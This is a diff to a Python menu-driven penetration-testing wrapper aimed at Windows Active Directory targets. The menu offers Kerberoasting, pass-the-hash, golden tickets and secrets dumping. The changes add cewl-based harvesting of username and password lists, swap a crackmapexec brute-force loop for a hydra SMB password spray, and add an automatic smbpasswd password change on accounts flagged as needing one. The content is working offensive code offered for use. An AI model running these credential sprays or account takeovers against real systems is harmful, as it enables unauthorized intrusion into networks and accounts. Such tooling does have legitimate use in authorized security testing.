@@ -290,10 +290,10 @@ def options():
    print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) GenPassList (72)           (82) SSH ID   " + '\u2551')
    print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) ACLPwn       (63) USER Editor (73)           (83) MySQL    " + '\u2551')
    print('\u2551' + "(4) Re/Set WEBADDRESS (14) Check DNS Record (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) Secrets Dump (64) PASS Editor (74)           (84) Telnet   " + '\u2551')
-   print('\u2551' + "(5) Re/Set USERNAME   (15) Check DNS Server (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) PASpray SMB (75)           (85) Netcat   " + '\u2551')
+   print('\u2551' + "(5) Re/Set USERNAME   (15) Check DNS Server (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) Hydra Spray (75)           (85) Netcat   " + '\u2551')
    print('\u2551' + "(6) Re/Set PASSWORD   (16) Scan LIVE PORTS  (26) SmbExec  (36) SmbClient      (46) Pass the Hash   (56) PSExec HASH  (66)             (76)           (86) EvilWinRm" + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH  (17) Scan SubDOMAINS  (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)             (77)           (87) RDesktop " + '\u2551')
-   print('\u2551' + "(8) Re/Set DOMAINNAME (18) Scan Server Time (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)             (78)           (88) XFreeRDP " + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH  (17) Find SubDOMAINS  (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)             (77)           (87) RDesktop " + '\u2551')
+   print('\u2551' + "(8) Re/Set DOMAINNAME (18) Sync ServerTimes (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)             (78)           (88) XFreeRDP " + '\u2551')
    print('\u2551' + "(9) Re/Set DOMAINSID  (19) GoBuster ADDRESS (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69)             (79)           (89) Quit!!..." + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
@@ -439,20 +439,23 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         print("[*] Attempting to enumerate live ports, please wait this can take sometime...")
-         command("ports=$(nmap -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
-         POR = linecache.getline("PORTS.tmp", 1)
+         if POR[:5] != "EMPTY":
+            print("[-] Ports already enumerated, skipping...")
+         else:
+            print("[*] Attempting to enumerate live ports, please wait this can take sometime...")
+            command("ports=$(nmap -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
+            POR = linecache.getline("PORTS.tmp", 1)
          
-         if len(POR) < COL1:
-            POR = padding(POR, COL1)
-         else:
-            POR = POR.rstrip("\n")
+            if len(POR) < COL1:
+               POR = padding(POR, COL1)
+            else:
+               POR = POR.rstrip("\n")
             
-         if POR[:1] == "":
-            print("[-] Unable to enumerate port information...")
-         else:
-            print("[+] Found ports...\n")
-            print(colored(POR,colour2, attrs=['bold']) + "\n")
+            if POR[:1] == "":
+               print("[-] Unable to enumerate port information...")
+            else:
+               print("[+] Found ports...\n")
+               print(colored(POR,colour2, attrs=['bold']) + "\n")
          
 # -------------------------------------------------------------------------------------      
       
@@ -1426,6 +1429,10 @@ while True:
             SHAR[x] = padding(SHAR[x], COL2)
          
          os.remove("SHARES.tmp")
+         
+         if SHAR[0]== "session setup failed: NT_STATUS_PASSWORD_MUS":
+            print("[*] Bonus!! It look's like we can change this users password...")
+            command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2116,13 +2123,13 @@ while True:
 
    if selection =='58':
       CheckParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
       if DOM[:5] == "EMPTY":
          print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
@@ -2174,20 +2181,26 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
-      if TIP[:5] != "EMPTY":
-         redirect = input("[*] Please enter the URL to parse or press ENTER to use defualt IP address: ")
-         if redirect == "":
-            command("cewl --depth 3 --min_word_length 3 --email --with-numbers --write usernames.txt " + TIP.rstrip(" ") + " 2>&1")
+      CheckParams = 0
+   
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1   
+   
+      if CheckParams != 1:
+         if WEB[:1] != "":
+            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + WEB.rstrip(" ") + " 2>&1")
+            print("[+] User list generated via website...")
          else:
-            command("cewl --depth 3 --min_word_length 3 --email --with-numbers --write usernames.txt " + redirect + " 2>&1")
-         print("\n[+] User list generated via website...")
+            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + TIP.rstrip(" ") + " 2>&1")
+            print("[+] User list generated via ip address...")
 
          if os.path.exists("/usr/share/ncrack/minimal.usr"):
             command("cat /usr/share/ncrack/minimal.usr >> usernames.txt 2>&1")
             command("sed -i '/#/d' usernames.txt 2>&1")
             command("sed -i '/Email addresses found/d' usernames.txt 2>&1")
             command("sed -i '/---------------------/d' usernames.txt 2>&1")
-            print("[+] NCrack minimal.usr list added as well...")
+            print("[+] Adding NCrack minimal.usr list as well...")
 
          for x in range (0,MAXX):
             USER[x] = linecache.getline("usernames.txt", x+1).rstrip(" ")
@@ -2198,25 +2211,31 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Active
-# Details : Menu option selected - Exit(1)
+# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='62':
-      if TIP[:5] != "EMPTY":
-         redirect = input("[*] Please enter the URL to parse or press ENTER to use defualt IP address: ")
-         if redirect == "":
-            command("cewl --depth 3 --min_word_length 3 --email --with-numbers --write passwords.txt " + TIP.rstrip(" ") + " 2>&1")
+      CheckParams = 0  
+   
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1   
+      
+      if CheckParams != 1:
+         if WEB[:1] != "":
+            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + WEB.rstrip(" ") + " 2>&1")
+            print("[+] Password list generated via website...")
          else:
-            command("cewl --depth 3 --min_word_length 3 --email --with-numbers --write passwords.txt " + redirect + " 2>&1")
-         print("\n[+] Password list generated via website...")
+            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + TIP.rstrip(" ") + " 2>&1")
+            print("[+] Password list generated via ip address...")
 
          if os.path.exists("/usr/share/ncrack/minimal.usr"):
             command("cat /usr/share/ncrack/minimal.usr >> passwords.txt 2>&1")
             command("sed -i '/#/d' passwords.txt 2>&1")
             command("sed -i '/Email addresses found/d' passwords.txt 2>&1")
             command("sed -i '/---------------------/d' passwords.txt 2>&1")
-            print("[+] NCrack minimal.usr list added as well...")
+            print("[+] Adding NCrack minimal.usr list as well...")
       prompt()
 
 #------------------------------------------------------------------------------------- 
@@ -2250,7 +2269,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Active
-# Details : Menu option selected - SMB Spray with USERS AND PASSWORDS
+# Details : Menu option selected - HYDRA SMB PASSWORD SPRAY
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2258,32 +2277,29 @@ while True:
       CheckParams = 0   
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
-      
-      if os.path.getsize("usernames.txt") == 0:
-         print("\n[-] Username file is empty...")
-         print("[*] Adding universal user 'administrator'")
-         command("echo administrator >> usernames.txt")
          
-      if os.path.getsize("passwords.txt") == 0:
-         print("\n[-] Password file is empty...")
-         print("[*] Adding universal password 'password'")
-         command("echo password >> passwords.txt")
-   
-      OutLoop = int(len(open('usernames.txt').readlines()))
-      InLoop  = int(len(open('passwords.txt').readlines()))
-      Reset   = InLoop
-      
-      print("")
-      while OutLoop != 0:
-         line1 = linecache.getline("usernames.txt", OutLoop).rstrip("\n")
-         while InLoop != 0:
-            line2 = linecache.getline("passwords.txt", InLoop).rstrip("\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + line1.rstrip(" ") + " -p " + line2.rstrip(" "))
-            InLoop -= 1
-         OutLoop -= 1
-         InLoop = Reset
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("\n[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
       prompt() 
             
 #------------------------------------------------------------------------------------- 
